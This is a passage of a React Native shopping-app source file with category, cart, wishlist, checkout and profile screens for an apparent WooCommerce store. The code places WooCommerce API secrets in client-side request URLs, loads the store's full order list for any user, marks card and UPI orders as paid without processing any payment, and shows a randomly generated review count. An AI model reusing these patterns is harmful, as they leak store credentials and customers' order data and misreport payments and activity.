                  <Text style={styles.ratingText}>{item.average_rating || '4.5'}</Text>
                </View>
                <TouchableOpacity
                  style={styles.addButton}
                  onPress={handleAddToCart}
                >
                  <Ionicons name="cart-outline" size={16} color="#fff" />
                  <Text style={styles.addButtonText}>Add</Text>
                </TouchableOpacity>
              </View>
            </View>
          </TouchableOpacity>
        </Animated.View>
      );
    };

    return (
      <View style={{ flex: 1, backgroundColor: '#FFF0F5' }}>
        {/* Header */}
        <View style={{
          flexDirection: 'row',
          alignItems: 'center',
          paddingHorizontal: 16,
          paddingTop: Platform.OS === 'ios' ? 50 : 40,
          paddingBottom: 16,
          backgroundColor: '#fff',
          borderBottomWidth: 1,
          borderBottomColor: '#f0f0f0',
        }}>
          <TouchableOpacity onPress={goBackToCategories} style={{
            width: 40,
            height: 40,
            borderRadius: 20,
            backgroundColor: '#FFF0F5',
            justifyContent: 'center',
            alignItems: 'center',
          }}>
            <Ionicons name="arrow-back" size={24} color="#1E90FF" />
          </TouchableOpacity>
          <Text style={{
            fontSize: 20,
            fontWeight: 'bold',
            color: '#1E90FF',
            flex: 1,
            textAlign: 'center',
          }}>
            {selectedCategory?.name}
          </Text>
          <View style={{ width: 40 }} />
        </View>

        {/* Products Count */}
        <View style={{
          paddingHorizontal: 16,
          paddingVertical: 12,
          backgroundColor: '#fff',
          marginBottom: 8,
        }}>
          <Text style={{ fontSize: 14, color: '#1E90FF' }}>
            {categoryProducts.length} products found
          </Text>
        </View>

        {/* Products Grid - Using ScrollView instead of FlatList for better performance with parent ScrollView */}
        {loadingCategoryProducts ? (
          <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center' }}>
            <ActivityIndicator size="large" color="#1E90FF" />
            <Text style={{ marginTop: 16, color: '#1E90FF' }}>Loading products...</Text>
          </View>
        ) : categoryProducts.length === 0 ? (
          <View style={{
            flex: 1,
            justifyContent: 'center',
            alignItems: 'center',
            paddingTop: 100,
          }}>
            <Ionicons name="cube-outline" size={80} color="#ccc" />
            <Text style={{ fontSize: 18, fontWeight: 'bold', color: '#1E90FF', marginTop: 20 }}>
              No products found
            </Text>
            <Text style={{ fontSize: 14, color: '#4169E1', marginTop: 8, marginBottom: 20 }}>
              No products available in {selectedCategory?.name}
            </Text>
            <TouchableOpacity onPress={goBackToCategories} style={{
              backgroundColor: '#1E90FF',
              paddingHorizontal: 30,
              paddingVertical: 12,
              borderRadius: 25,
            }}>
              <Text style={{ color: '#FFF0F5', fontSize: 16, fontWeight: '600' }}>Back to Categories</Text>
            </TouchableOpacity>
          </View>
        ) : (
          <ScrollView 
            showsVerticalScrollIndicator={false}
            contentContainerStyle={{ paddingBottom: 20 }}
          >
            <View style={{ flexDirection: 'row', flexWrap: 'wrap', justifyContent: 'space-between', paddingHorizontal: 10 }}>
              {categoryProducts.map((item, index) => (
                <View key={item?.id || index} style={{ width: '50%' }}>
                  <ProductCard item={item} index={index} />
                </View>
              ))}
            </View>
          </ScrollView>
        )}
      </View>
    );
  };

  // Top Category Buttons (Horizontal Scroll with NAMES only)
  const TopCategoryButtons = () => {
    const topCategories = filteredCategories.slice(0, 20);
    
    return (
      <View style={{ marginVertical: 16 }}>
        <ScrollView 
          horizontal 
          showsHorizontalScrollIndicator={false}
          contentContainerStyle={{ paddingHorizontal: 16, gap: 12 }}
        >
          {topCategories.map((category) => (
            <TouchableOpacity
              key={category.id}
              style={{
                alignItems: 'center',
                justifyContent: 'center',
                backgroundColor: '#FFFFFF',
                paddingHorizontal: 20,
                paddingVertical: 12,
                borderRadius: 30,
                minWidth: 100,
                elevation: 2,
                shadowColor: '#1E90FF',
                shadowOffset: { width: 0, height: 2 },
                shadowOpacity: 0.2,
                shadowRadius: 4,
              }}
              onPress={() => handleCategoryPress(category)}
            >
              <Text style={{
                fontSize: 14,
                fontWeight: '600',
                color: '#000000',
                textAlign: 'center',
              }} numberOfLines={1}>
                {category.name}
              </Text>
            </TouchableOpacity>
          ))}
        </ScrollView>
      </View>
    );
  };

  // Category Section Component (Colored Card + Product Carousel) - OPTIMIZED
  // Category Section Component (Colored Card + Product Carousel)
const CategorySection = ({ category, index }) => {
  const [products, setProducts] = useState([]);
  const [isLoading, setIsLoading] = useState(true);  // CHANGE to true
  const bgColor = cardColors[index % cardColors.length];

  useEffect(() => {
    loadProducts();
  }, []);

  const loadProducts = async () => {
    setIsLoading(true);
    const fetchedProducts = await fetchProductsByCategory(category.id);
    setProducts(fetchedProducts);
    setIsLoading(false);
  };

  return (
    <View style={{ marginBottom: 40 }}>
      {/* Colored Card */}
      <TouchableOpacity
        style={{
          backgroundColor: bgColor,
          borderRadius: 20,
          paddingTop: 20,
          paddingBottom: 80,
          paddingHorizontal: 16,
          marginHorizontal: 16,
          position: 'relative',
          elevation: 4,
          shadowColor: '#000',
          shadowOffset: { width: 0, height: 4 },
          shadowOpacity: 0.15,
          shadowRadius: 8,
          height: 160,
        }}
        onPress={() => handleCategoryPress(category)}
        activeOpacity={0.9}
      >
        {/* Category Name at Top Right */}
        <Text style={{
          position: 'absolute',
          top: 16,
          right: 16,
          fontSize: 24,
          fontWeight: '300',
          color: '#FFFFFF',
          fontFamily: Platform.OS === 'ios' ? 'Didot' : 'serif',
          letterSpacing: 2,
          textAlign: 'right',
          maxWidth: '60%',
          fontStyle: 'normal',
          textShadow: '0px 1px 2px rgba(0,0,0,0.2)',
        }}>
          {category.name}
        </Text>
        
        {/* Product Count */}
        <Text style={{
          position: 'absolute',
          bottom: 16,
          left: 16,
          fontSize: 13,
          fontWeight: '500',
          color: 'rgba(255,255,255,0.9)',
          fontFamily: Platform.OS === 'ios' ? 'AvenirNext-Medium' : 'sans-serif-medium',
          letterSpacing: 0.5,
        }}>
          {category.count || 0} PRODUCTS
        </Text>
      </TouchableOpacity>

      {/* Product Carousel */}
      <View style={{
        marginTop: -50,
        marginHorizontal: 16,
        backgroundColor: 'transparent',
        borderRadius: 16,
        paddingVertical: 8,
      }}>
        {isLoading ? (
          <View style={{ padding: 20, alignItems: 'center', backgroundColor: '#fff', borderRadius: 16, borderWidth: 1, borderColor: '#D4AF37' }}>
            <ActivityIndicator size="small" color="#D4AF37" />
            <Text style={{ marginTop: 8, fontSize: 12, color: '#D4AF37' }}>Loading products...</Text>
          </View>
        ) : products.length === 0 ? (
          <View style={{ padding: 20, alignItems: 'center', backgroundColor: '#fff', borderRadius: 16, borderWidth: 1, borderColor: '#D4AF37' }}>
            <Ionicons name="cube-outline" size={40} color="#D4AF37" />
            <Text style={{ fontSize: 12, color: '#D4AF37', marginTop: 8 }}>No products available</Text>
          </View>
        ) : (
          <ScrollView 
            horizontal 
            showsHorizontalScrollIndicator={false}
            contentContainerStyle={{ paddingHorizontal: 8, gap: 12 }}
          >
            {products.map((product) => (
              <TouchableOpacity
                key={product.id}
                style={{ 
                  width: 130,
                  backgroundColor: '#fff',
                  borderRadius: 16,
                  padding: 8,
                  elevation: 5,
                  shadowColor: '#000',
                  shadowOffset: { width: 0, height: 4 },
                  shadowOpacity: 0.15,
                  shadowRadius: 8,
                  borderWidth: 1,
                  borderColor: '#D4AF37',
                }}
                onPress={() => navigation.navigate('ProductDetail', { 
                  product: { ...product, price: parseFloat(product.price) } 
                })}
              >
                <Image 
                  source={{ uri: product.images?.[0]?.src || 'https://via.placeholder.com/120' }} 
                  style={{ 
                    width: '100%', 
                    height: 120, 
                    borderRadius: 12, 
                    resizeMode: 'cover',
                    backgroundColor: '#f5f5f5',
                  }} 
                />
                <Text style={{
                  fontSize: 11,
                  fontWeight: '500',
                  color: '#1E90FF',
                  marginTop: 6,
                  textAlign: 'center',
                }} numberOfLines={2}>
                  {product.name}
                </Text>
                <Text style={{
                  fontSize: 12,
                  fontWeight: 'bold',
                  color: '#4169E1',
                  marginTop: 4,
                  textAlign: 'center',
                }}>
                  ₹{parseFloat(product.price).toFixed(0)}
                </Text>
              </TouchableOpacity>
            ))}
          </ScrollView>
        )}
      </View>
    </View>
  );
};

  // Search Header Component
  const SearchHeader = () => {
    return (
      <View style={{
        backgroundColor: '#FFF0F5',
        paddingTop: Platform.OS === 'ios' ? 50 : 40,
        paddingBottom: 12,
        paddingHorizontal: 16,
        borderBottomWidth: 1,
        borderBottomColor: '#f0f0f0',
      }}>
        <View style={{
          flexDirection: 'row',
          alignItems: 'center',
          justifyContent: 'space-between',
          marginBottom: 12,
        }}>
          <TouchableOpacity 
            onPress={() => navigation.goBack()} 
            style={{
              width: 40,
              height: 40,
              borderRadius: 20,
              backgroundColor: '#fff',
              justifyContent: 'center',
              alignItems: 'center',
              elevation: 2,
            }}
          >
            <Ionicons name="arrow-back" size={24} color="#1E90FF" />
          </TouchableOpacity>
          
          <Text style={{
            fontSize: 20,
            fontWeight: 'bold',
            color: '#1E90FF',
            fontFamily: Platform.OS === 'ios' ? 'Didot' : 'serif',
          }}>Categories</Text>
          
          <TouchableOpacity 
            onPress={() => setShowSearch(!showSearch)} 
            style={{
              width: 40,
              height: 40,
              borderRadius: 20,
              backgroundColor: '#fff',
              justifyContent: 'center',
              alignItems: 'center',
              elevation: 2,
            }}
          >
            <Ionicons name="search-outline" size={24} color="#1E90FF" />
          </TouchableOpacity>
        </View>

        {showSearch && (
          <View style={{ paddingBottom: 8 }}>
            <View style={{
              flexDirection: 'row',
              alignItems: 'center',
              backgroundColor: '#fff',
              borderRadius: 12,
              paddingHorizontal: 15,
              paddingVertical: 12,
              gap: 10,
            }}>
              <Ionicons name="search-outline" size={20} color="#1E90FF" />
              <TextInput
                ref={searchInputRef}
                style={{ flex: 1, fontSize: 16, color: '#1E90FF' }}
                placeholder="Search categories..."
                placeholderTextColor="#999"
                value={searchQuery}
                onChangeText={setSearchQuery}
                autoFocus={true}
              />
              {searchQuery.length > 0 && (
                <TouchableOpacity onPress={() => setSearchQuery('')}>
                  <Ionicons name="close-circle" size={20} color="#1E90FF" />
                </TouchableOpacity>
              )}
            </View>
            {searchQuery.length > 0 && (
              <View style={{
                flexDirection: 'row',
                justifyContent: 'space-between',
                alignItems: 'center',
                marginTop: 10,
                paddingHorizontal: 4,
              }}>
                <Text style={{ fontSize: 13, color: '#1E90FF' }}>
                  {filteredCategories.length} categories found
                </Text>
                <TouchableOpacity onPress={clearFilters}>
                  <Text style={{ fontSize: 13, color: '#1E90FF', fontWeight: '500' }}>Clear</Text>
                </TouchableOpacity>
              </View>
            )}
          </View>
        )}
      </View>
    );
  };

  if (showProductsPage) {
    return <CategoryProductsPage />;
  }

  if (loading) {
    return (
      <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center', backgroundColor: '#FFF0F5' }}>
        <ActivityIndicator size="large" color="#1E90FF" />
        <Text style={{ marginTop: 16, fontSize: 16, color: '#1E90FF' }}>Loading categories...</Text>
      </View>
    );
  }

  return (
    <SafeAreaView style={{ flex: 1, backgroundColor: '#FFF0F5' }}>
      <SearchHeader />
      
      <ScrollView
        showsVerticalScrollIndicator={false}
        contentContainerStyle={{ paddingBottom: 40 }}
      >
        {/* Top Category Buttons */}
        {filteredCategories.length > 0 && <TopCategoryButtons />}
        
        {/* Separator */}
        <View style={{
          height: 1,
          backgroundColor: '#e0e0e0',
          marginHorizontal: 16,
          marginVertical: 8,
        }} />
        
        {/* ALL Categories Sections - Products load only when tapped */}
        {filteredCategories.length === 0 ? (
          <View style={{ padding: 40, alignItems: 'center' }}>
            <Ionicons name="folder-open-outline" size={80} color="#ccc" />
            <Text style={{ fontSize: 18, fontWeight: 'bold', color: '#1E90FF', marginTop: 20 }}>
              No categories found
            </Text>
            <Text style={{ fontSize: 14, color: '#4169E1', marginTop: 8, textAlign: 'center' }}>
              Try adjusting your search
            </Text>
          </View>
        ) : (
          filteredCategories.map((category, index) => (
            <CategorySection 
              key={category.id} 
              category={category} 
              index={index}
            />
          ))
        )}
        
        <View style={{ height: 20 }} />
      </ScrollView>
    </SafeAreaView>
  );
};
// ========== CART SCREEN ==========
const CartScreen = ({ navigation }) => {
  const { cart, removeFromCart, updateQuantity, getSubtotal, getTotal, getItemCount } = useContext(CartContext);

  if (cart.length === 0) {
    return (
      <View style={styles.emptyContainer}>
        <Ionicons name="cart-outline" size={80} color="#ccc" />
        <Text style={styles.emptyTitle}>Your cart is empty</Text>
        <Text style={styles.emptyText}>Looks like you haven't added anything yet</Text>
        <TouchableOpacity style={styles.emptyButton} onPress={() => navigation.navigate('Home')}>
          <Text style={styles.emptyButtonText}>Start Shopping</Text>
        </TouchableOpacity>
      </View>
    );
  }

  return (
    <View style={styles.cartContainer}>
      <FlatList
        data={cart}
        showsVerticalScrollIndicator={true}
        renderItem={({ item }) => (
          <View style={styles.cartItem}>
            <Image source={{ uri: item.images?.[0]?.src }} style={styles.cartImage} />
            <View style={styles.cartDetails}>
              <Text style={styles.cartName} numberOfLines={2}>{item.name}</Text>
              <Text style={styles.cartPrice}>₹{item.price}</Text>
              <View style={styles.cartActions}>
                <View style={styles.cartQuantity}>
                  <TouchableOpacity onPress={() => updateQuantity(item.id, (item.quantity || 1) - 1)} style={styles.cartQtyBtn}><Text>-</Text></TouchableOpacity>
                  <Text style={styles.cartQtyValue}>{item.quantity || 1}</Text>
                  <TouchableOpacity onPress={() => updateQuantity(item.id, (item.quantity || 1) + 1)} style={styles.cartQtyBtn}><Text>+</Text></TouchableOpacity>
                </View>
                <TouchableOpacity onPress={() => removeFromCart(item.id)}>
                  <Ionicons name="trash-outline" size={24} color="#ff4444" />
                </TouchableOpacity>
              </View>
            </View>
          </View>
        )}
        keyExtractor={item => item.id.toString()}
        contentContainerStyle={styles.cartList}
      />
      
      <View style={styles.cartFooter}>
        <View style={styles.totalRow}>
          <Text style={styles.totalLabel}>Subtotal ({getItemCount()} items)</Text>
          <Text style={styles.totalValue}>₹{getSubtotal().toFixed(2)}</Text>
        </View>
        <View style={styles.totalRow}>
          <Text style={styles.totalLabel}>Shipping</Text>
          <Text style={styles.totalValue}>₹50.00</Text>
        </View>
        <View style={[styles.totalRow, styles.grandTotal]}>
          <Text style={styles.grandTotalLabel}>Total</Text>
          <Text style={styles.grandTotalValue}>₹{getTotal().toFixed(2)}</Text>
        </View>
        <TouchableOpacity style={styles.checkoutButton} onPress={() => navigation.navigate('Checkout')}>
          <Text style={styles.checkoutButtonText}>Proceed to Checkout</Text>
        </TouchableOpacity>
      </View>
    </View>
  );
};

// ========== WISHLIST SCREEN ==========
const WishlistScreen = ({ navigation }) => {
  const { wishlist, removeFromWishlist } = useContext(WishlistContext);
  const { addToCart } = useContext(CartContext);

  if (wishlist.length === 0) {
    return (
      <View style={styles.emptyContainer}>
        <Ionicons name="heart-outline" size={80} color="#ccc" />
        <Text style={styles.emptyTitle}>Your wishlist is empty</Text>
        <Text style={styles.emptyText}>Save your favorite items here</Text>
        <TouchableOpacity style={styles.emptyButton} onPress={() => navigation.navigate('Home')}>
          <Text style={styles.emptyButtonText}>Explore Products</Text>
        </TouchableOpacity>
      </View>
    );
  }

  return (
    <FlatList
      data={wishlist}
      showsVerticalScrollIndicator={true}
      renderItem={({ item }) => (
        <View style={styles.wishlistItem}>
          <Image source={{ uri: item.images?.[0]?.src }} style={styles.wishlistImage} />
          <View style={styles.wishlistDetails}>
            <Text style={styles.wishlistName}>{item.name}</Text>
            <Text style={styles.wishlistPrice}>₹{item.price}</Text>
            <View style={styles.wishlistActions}>
              <TouchableOpacity style={styles.wishlistAddButton} onPress={() => { addToCart(item); removeFromWishlist(item.id); Alert.alert('Added to cart'); }}>
                <Text style={styles.wishlistAddText}>Add to Cart</Text>
              </TouchableOpacity>
              <TouchableOpacity onPress={() => removeFromWishlist(item.id)}>
                <Ionicons name="trash-outline" size={24} color="#ff4444" />
              </TouchableOpacity>
            </View>
          </View>
        </View>
      )}
      keyExtractor={item => item.id.toString()}
      contentContainerStyle={styles.wishlistList}
    />
  );
};

// ========== CHECKOUT SCREEN ==========
const CheckoutScreen = ({ navigation }) => {
  const { getTotal, clearCart, cart } = useContext(CartContext);
  const [formData, setFormData] = useState({
    name: '', email: '', phone: '', address: '', city: '', pincode: '', paymentMethod: 'COD'
  });
  const [loading, setLoading] = useState(false);

  const subtotal = cart.reduce((sum, item) => {
    const price = parseFloat(item.price) || 0;
    const qty = item.quantity || 1;
    return sum + (price * qty);
  }, 0);
  const shipping = 50;
  const total = subtotal + shipping;

  const handlePlaceOrder = async () => {
    if (!formData.name || !formData.email || !formData.phone || !formData.address) {
      Alert.alert('Error', 'Please fill all required fields');
      return;
    }

    if (cart.length === 0) {
      Alert.alert('Error', 'Your cart is empty');
      return;
    }

    setLoading(true);

    try {
      const orderData = {
        payment_method: formData.paymentMethod === 'COD' ? 'cod' : 'bacs',
        payment_method_title: formData.paymentMethod,
        set_paid: formData.paymentMethod !== 'COD',
        billing: {
          first_name: formData.name.split(' ')[0] || '',
          last_name: formData.name.split(' ').slice(1).join(' ') || '',
          address_1: formData.address,
          city: formData.city || 'Unknown',
          postcode: formData.pincode || '',
          country: 'IN',
          email: formData.email,
          phone: formData.phone
        },
        shipping: {
          first_name: formData.name.split(' ')[0] || '',
          last_name: formData.name.split(' ').slice(1).join(' ') || '',
          address_1: formData.address,
          city: formData.city || 'Unknown',
          postcode: formData.pincode || '',
          country: 'IN'
        },
        line_items: cart.map(item => ({
          product_id: item.id,
          quantity: item.quantity || 1
        })),
        shipping_lines: [{
          method_id: 'flat_rate',
          method_title: 'Flat Rate',
          total: '50.00'
        }]
      };

      const url = `${API_URL}/orders?consumer_key=${CONSUMER_KEY}&consumer_secret=${CONSUMER_SECRET}`;
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(orderData)
      });

      const result = await response.json();

      if (response.ok && result.id) {
        Alert.alert(
          '✅ Order Placed!',
          `Order #${result.id}\nTotal: ₹${total.toFixed(2)}`,
          [{ text: 'OK', onPress: () => { clearCart(); navigation.navigate('Home'); } }]
        );
      } else {
        Alert.alert('Order Failed', result.message || 'Something went wrong');
      }
    } catch (error) {
      Alert.alert('Error', 'Network error. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <View style={{ flex: 1, backgroundColor: '#f8f8f8' }}>
      <View style={styles.checkoutHeader}>
        <TouchableOpacity onPress={() => navigation.goBack()} style={styles.checkoutBackButton}>
          <Ionicons name="arrow-back" size={20} color="#333" />
        </TouchableOpacity>
        <Text style={styles.checkoutHeaderTitle}>Checkout</Text>
        <View style={{ width: 35 }} />
      </View>

      <ScrollView 
        style={{ flex: 1 }}
        showsVerticalScrollIndicator={true}
        nestedScrollEnabled={true}
      >
        <View style={styles.checkoutScrollContent}>
          
          <View style={styles.orderSummaryCard}>
            <Text style={styles.orderSummaryTitle}>🛍️ Order ({cart.length})</Text>
            
            {cart.map((item, idx) => {
              const price = parseFloat(item.price) || 0;
              const qty = item.quantity || 1;
              return (
                <View key={idx} style={styles.orderItem}>
                  <Text style={styles.orderItemName} numberOfLines={1}>{item.name}</Text>
                  <Text style={styles.orderItemQty}>x{qty}</Text>
                  <Text style={styles.orderItemPrice}>₹{(price * qty).toFixed(2)}</Text>
                </View>
              );
            })}
            
            <View style={styles.orderDivider} />
            
            <View style={styles.orderTotalRow}>
              <Text style={styles.orderTotalLabel}>Total</Text>
              <Text style={styles.orderTotalValue}>₹{total.toFixed(2)}</Text>
            </View>
          </View>

          <View style={styles.orderSummaryCard}>
            <Text style={styles.orderSummaryTitle}>📋 Shipping</Text>
            
            <View style={styles.rowInputs}>
              <View style={styles.inputWrapper}>
                <Ionicons name="person-outline" size={16} color="#999" />
                <TextInput 
                  style={{ flex: 1, paddingVertical: 12, paddingHorizontal: 6, fontSize: 13 }}
                  placeholder="Name *" 
                  value={formData.name} 
                  onChangeText={t => setFormData({...formData, name: t})} 
                />
              </View>
              <View style={styles.inputWrapper}>
                <Ionicons name="mail-outline" size={16} color="#999" />
                <TextInput 
                  style={{ flex: 1, paddingVertical: 12, paddingHorizontal: 6, fontSize: 13 }}
                  placeholder="Email *" 
                  value={formData.email} 
                  onChangeText={t => setFormData({...formData, email: t})} 
                  keyboardType="email-address"
                />
              </View>
            </View>

            <View style={styles.rowInputs}>
              <View style={styles.inputWrapper}>
                <Ionicons name="call-outline" size={16} color="#999" />
                <TextInput 
                  style={{ flex: 1, paddingVertical: 12, paddingHorizontal: 6, fontSize: 13 }}
                  placeholder="Phone *" 
                  value={formData.phone} 
                  onChangeText={t => setFormData({...formData, phone: t})} 
                  keyboardType="phone-pad"
                />
              </View>
              <View style={styles.inputWrapper}>
                <Ionicons name="location-outline" size={16} color="#999" />
                <TextInput 
                  style={{ flex: 1, paddingVertical: 12, paddingHorizontal: 6, fontSize: 13 }}
                  placeholder="Address *" 
                  value={formData.address} 
                  onChangeText={t => setFormData({...formData, address: t})} 
                />
              </View>
            </View>

            <View style={styles.rowInputs}>
              <View style={styles.inputWrapper}>
                <Ionicons name="business-outline" size={16} color="#999" />
                <TextInput 
                  style={{ flex: 1, paddingVertical: 12, paddingHorizontal: 6, fontSize: 13 }}
                  placeholder="City" 
                  value={formData.city} 
                  onChangeText={t => setFormData({...formData, city: t})} 
                />
              </View>
              <View style={styles.inputWrapper}>
                <Ionicons name="mail-outline" size={16} color="#999" />
                <TextInput 
                  style={{ flex: 1, paddingVertical: 12, paddingHorizontal: 6, fontSize: 13 }}
                  placeholder="Pincode" 
                  value={formData.pincode} 
                  onChangeText={t => setFormData({...formData, pincode: t})} 
                  keyboardType="numeric"
                />
              </View>
            </View>
          </View>

          <View style={styles.orderSummaryCard}>
            <Text style={styles.orderSummaryTitle}>💳 Payment</Text>
            <View style={{ flexDirection: 'row', gap: 12 }}>
              {['COD', 'Credit Card', 'UPI'].map(method => (
                <TouchableOpacity 
                  key={method} 
                  style={{ flexDirection: 'row', alignItems: 'center', gap: 6 }} 
                  onPress={() => setFormData({...formData, paymentMethod: method})}
                >
                  <Ionicons 
                    name={formData.paymentMethod === method ? 'radio-button-on' : 'radio-button-off'} 
                    size={18} 
                    color="#6200ee" 
                  />
                  <Text style={{ fontSize: 13, color: '#333' }}>{method}</Text>
                  {method === 'COD' && (
                    <View style={styles.codBadge}>
                      <Text style={styles.codBadgeText}>Save</Text>
                    </View>
                  )}
                </TouchableOpacity>
              ))}
            </View>
          </View>

          <TouchableOpacity 
            style={[styles.placeOrderButton, loading && { backgroundColor: '#ccc' }]} 
            onPress={handlePlaceOrder} 
            disabled={loading}
          >
            <Text style={styles.placeOrderText}>
              {loading ? 'Placing...' : `Place Order • ₹${total.toFixed(2)}`}
            </Text>
          </TouchableOpacity>
          
          <View style={styles.footerSpacer} />
        </View>
      </ScrollView>

      {loading && (
        <View style={styles.loadingOverlay}>
          <ActivityIndicator size="large" color="#fff" />
          <Text style={styles.loadingOverlayText}>Processing...</Text>
        </View>
      )}
    </View>
  );
};
// ========== PROFILE SCREEN (COMPLETE WITH ALL PAGES BUILT-IN) ==========
const ProfileScreen = ({ navigation }) => {
  const { getTotal, clearCart } = useContext(CartContext);
  const { wishlist, clearWishlist } = useContext(WishlistContext);
  const [activePage, setActivePage] = useState('profile'); // profile, orders, address, notifications
  const [user, setUser] = useState({
    name: 'John Doe',
    email: 'john.doe@example.com',
    avatar: 'https://images.pexels.com/photos/220453/pexels-photo-220453.jpeg?w=200',
    phone: '+91 98765 43210',
    joinDate: 'January 2024',
    address: '123 Main Street, Andheri East, Mumbai - 400069',
    city: 'Mumbai',
    state: 'Maharashtra',
    pincode: '400069',
  });
  const [orders, setOrders] = useState([]);
  const [orderCount, setOrderCount] = useState(0);
  const [reviewCount, setReviewCount] = useState(0);
  const [isEditing, setIsEditing] = useState(false);
  const [editForm, setEditForm] = useState({ ...user });
  const [notifications, setNotifications] = useState([
    { id: 1, title: 'Order Delivered', message: 'Your order #12345 has been delivered', date: '2 hours ago', read: false },
    { id: 2, title: 'Special Offer', message: 'Get 20% off on your next purchase', date: '1 day ago', read: false },
    { id: 3, title: 'New Arrival', message: 'Check out our new summer collection', date: '3 days ago', read: true },
  ]);

  useEffect(() => {
    loadUserData();
    loadOrders();
  }, []);

  const loadUserData = async () => {
    try {
      const savedUser = await AsyncStorage.getItem('userData');
      if (savedUser) {
        setUser(JSON.parse(savedUser));
        setEditForm(JSON.parse(savedUser));
      }
    } catch (error) {
      console.log("Error loading user data:", error);
    }
  };

  const saveUserData = async (updatedUser) => {
    try {
      await AsyncStorage.setItem('userData', JSON.stringify(updatedUser));
      setUser(updatedUser);
    } catch (error) {
      console.log("Error saving user data:", error);
    }
  };

  const loadOrders = async () => {
    try {
      const url = `${API_URL}/orders?consumer_key=${CONSUMER_KEY}&consumer_secret=${CONSUMER_SECRET}&per_page=50`;
      const response = await fetch(url);
      const data = await response.json();
      setOrders(data);
      setOrderCount(data.length || 0);
      setReviewCount(Math.floor(Math.random() * 50) + 5);
    } catch (error) {
      console.error("Error loading orders:", error);
      setOrders([]);
      setOrderCount(0);
    }
  };

  const handleLogout = () => {
    Alert.alert(
      'Logout',
      'Are you sure you want to logout?',
      [
        { text: 'Cancel', style: 'cancel' },
        { 
          text: 'Logout', 
          style: 'destructive',
          onPress: () => {
            clearCart();
            clearWishlist();
            setActivePage('profile');
            Alert.alert('Logged Out', 'You have been logged out successfully.');
          }
        }
      ]
    );
  };

  const handleUpdateProfile = () => {
    saveUserData(editForm);
    setIsEditing(false);
    Alert.alert('Success', 'Profile updated successfully');
  };

  const markNotificationRead = (id) => {
    setNotifications(notifications.map(notif => 
      notif.id === id ? { ...notif, read: true } : notif
    ));
  };

  // ========== ORDERS PAGE ==========
  const OrdersPage = () => (
    <View style={{ flex: 1 }}>
      <View style={{ flexDirection: 'row', alignItems: 'center', paddingHorizontal: 16, paddingVertical: 16, backgroundColor: '#fff', borderBottomWidth: 1, borderBottomColor: '#f0f0f0' }}>
        <TouchableOpacity onPress={() => setActivePage('profile')} style={{ width: 40, height: 40, borderRadius: 20, backgroundColor: '#f0f0f0', justifyContent: 'center', alignItems: 'center' }}>
          <Ionicons name="arrow-back" size={24} color="#333" />
        </TouchableOpacity>
        <Text style={{ fontSize: 20, fontWeight: 'bold', color: '#333', flex: 1, textAlign: 'center', fontFamily: Platform.OS === 'ios' ? 'Didot' : 'serif' }}>My Orders</Text>
        <View style={{ width: 40 }} />
      </View>
      
      {orders.length === 0 ? (
        <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center', paddingHorizontal: 40 }}>
          <Ionicons name="bag-outline" size={80} color="#ccc" />
          <Text style={{ fontSize: 18, fontWeight: 'bold', color: '#333', marginTop: 20, textAlign: 'center' }}>No orders yet</Text>
          <Text style={{ fontSize: 14, color: '#999', marginTop: 8, textAlign: 'center' }}>Your orders will appear here</Text>
        </View>
      ) : (
        <FlatList
          data={orders}
          keyExtractor={(item) => item.id.toString()}
          contentContainerStyle={{ padding: 16 }}
          renderItem={({ item }) => (
            <View style={{ backgroundColor: '#fff', borderRadius: 12, padding: 16, marginBottom: 12, elevation: 2, shadowColor: '#000', shadowOffset: { width: 0, height: 2 }, shadowOpacity: 0.05, shadowRadius: 4 }}>
              <View style={{ flexDirection: 'row', justifyContent: 'space-between', marginBottom: 8 }}>
                <Text style={{ fontSize: 14, fontWeight: 'bold', color: '#D4AF37' }}>Order #{item.id}</Text>
                <Text style={{ fontSize: 12, color: '#666' }}>{new Date(item.date_created).toLocaleDateString('en-IN')}</Text>
              </View>
              <Text style={{ fontSize: 12, color: '#333', marginBottom: 4 }}>Total: ₹{parseFloat(item.total).toFixed(2)}</Text>
              <View style={{ flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', marginTop: 8 }}>
                <View style={{ backgroundColor: item.status === 'completed' ? '#E8F5E9' : '#FFF3E0', paddingHorizontal: 10, paddingVertical: 4, borderRadius: 12 }}>
                  <Text style={{ fontSize: 11, color: item.status === 'completed' ? '#4CAF50' : '#FF9800' }}>{item.status || 'Processing'}</Text>
                </View>
                <TouchableOpacity style={{ backgroundColor: '#D4AF37', paddingHorizontal: 12, paddingVertical: 6, borderRadius: 8 }}>
                  <Text style={{ fontSize: 11, color: '#fff', fontWeight: '500' }}>Track Order</Text>
                </TouchableOpacity>
              </View>
            </View>
          )}
        />
      )}
    </View>
  );

  // ========== ADDRESS BOOK PAGE ==========
  const AddressBookPage = () => {
    const [addresses, setAddresses] = useState([
      { id: 1, type: 'Home', address: user.address, isDefault: true },
      { id: 2, type: 'Office', address: '456 Business Park, Andheri East, Mumbai - 400069', isDefault: false },
    ]);
    const [showAddAddress, setShowAddAddress] = useState(false);
    const [newAddress, setNewAddress] = useState({ type: 'Home', address: '' });

    const addAddress = () => {
      if (newAddress.address) {
        setAddresses([...addresses, { id: Date.now(), ...newAddress, isDefault: false }]);
        setNewAddress({ type: 'Home', address: '' });
        setShowAddAddress(false);
        Alert.alert('Success', 'Address added successfully');
      }
    };

    return (
      <View style={{ flex: 1 }}>
        <View style={{ flexDirection: 'row', alignItems: 'center', paddingHorizontal: 16, paddingVertical: 16, backgroundColor: '#fff', borderBottomWidth: 1, borderBottomColor: '#f0f0f0' }}>
          <TouchableOpacity onPress={() => setActivePage('profile')} style={{ width: 40, height: 40, borderRadius: 20, backgroundColor: '#f0f0f0', justifyContent: 'center', alignItems: 'center' }}>
            <Ionicons name="arrow-back" size={24} color="#333" />
          </TouchableOpacity>
          <Text style={{ fontSize: 20, fontWeight: 'bold', color: '#333', flex: 1, textAlign: 'center', fontFamily: Platform.OS === 'ios' ? 'Didot' : 'serif' }}>Address Book</Text>
          <TouchableOpacity onPress={() => setShowAddAddress(true)} style={{ width: 40, height: 40, borderRadius: 20, backgroundColor: '#D4AF37', justifyContent: 'center', alignItems: 'center' }}>
            <Ionicons name="add" size={24} color="#fff" />
          </TouchableOpacity>
        </View>

        <FlatList
          data={addresses}
          keyExtractor={(item) => item.id.toString()}
